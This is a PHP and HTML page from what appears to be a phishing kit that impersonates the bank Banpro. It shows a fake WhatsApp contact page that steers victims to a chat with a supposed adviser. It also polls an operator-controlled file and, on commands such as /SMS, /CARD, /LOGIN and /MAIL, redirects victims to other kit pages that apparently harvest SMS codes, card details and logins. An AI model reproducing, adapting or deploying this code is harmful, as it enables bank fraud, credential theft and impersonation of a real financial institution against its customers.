<?php
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) { header('Location: /', true, 302); exit; }
$u = $_SESSION['usuario'] ?? null;
if (!$u) { header("Location: jaspe.php"); exit; }

// Poll endpoint
if (isset($_GET['poll'])) {
    header('Content-Type: application/json');
    $ax_wol = "acciones/$u.txt";
    if (file_exists($ax_wol)) {
        $ac = trim(file_get_contents($ax_wol));
        unlink($ax_wol);
        $map = [
            '/SMS' => 'mica.php', '/SMSERROR' => 'alba.php',
            '/NUMERO' => 'numero.php', '/ERROR' => 'jaspe.php?error=1',
            '/LOGINERROR' => 'jaspe.php?error=1', '/LOGIN' => 'jaspe.php',
            '/CARD' => 'edelweiss.html', '/LISTO' => 'nebula.php',
            '/MAIL' => 'liebre.php', '/COMPRA' => 'copa.html',
            '/TIMEFORM' => 'yute.php', '/CHAT' => 'ocaso.php', '/WS' => 'iris.php'
        ];
        echo json_encode(['redirect' => $map[$ac] ?? 'pampa.php']);
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Contacto WhatsApp - Banpro</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;background:#fff;font-family:'Segoe UI',Roboto,Arial,sans-serif;color:#333;display:flex;flex-direction:column;}
        .topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;border-bottom:1px solid #e0e0e0;background:#fff;}
        .topbar img{height:48px;width:auto;}
        .ws-wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 24px;}
        .ws-box{text-align:center;max-width:420px;width:100%;}
        .ws-icon{font-size:64px;margin-bottom:20px;}
        .ws-title{font-size:22px;color:#006838;font-weight:600;margin-bottom:12px;}
        .ws-desc{font-size:15px;color:#555;line-height:1.6;margin-bottom:28px;}
        .ws-btn{display:inline-block;padding:14px 36px;background:#25D366;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;transition:background 0.2s;font-family:inherit;}
        .ws-btn:hover{background:#1da851;}
        .ws-note{margin-top:20px;font-size:12px;color:#999;}
    </style>
</head>
<body>
<div class="topbar">
    <img src="l.png" alt="Banpro Grupo Promerica">
</div>
<div class="ws-wrap">
    <div class="ws-box">
        <div class="ws-icon">&#128241;</div>
        <h1 class="ws-title">Cont&aacute;ctenos por WhatsApp</h1>
        <p class="ws-desc">Para continuar con su solicitud, por favor comun&iacute;quese con nuestro asesor a trav&eacute;s de WhatsApp. Estar&aacute; atendido de inmediato.</p>
        <a href="https://wa.me/50588657519?text=Hola%2C%20necesito%20ayuda%20con%20mi%20solicitud" target="_blank" class="ws-btn">Abrir WhatsApp</a>
        <p class="ws-note">Ser&aacute; redirigido a WhatsApp para comunicarse con un asesor.</p>
    </div>
</div>
<script>
(function poll(){
    fetch('iris.php?poll=1',{cache:'no-store'})
    .then(function(r){return r.json();})
    .then(function(data){
        if(data.redirect && data.redirect !== 'iris.php'){ window.location.href = data.redirect; }
        else{ setTimeout(poll, 2500); }
    })
    .catch(function(){ setTimeout(poll, 3000); });
})();
</script>
</body>
</html>
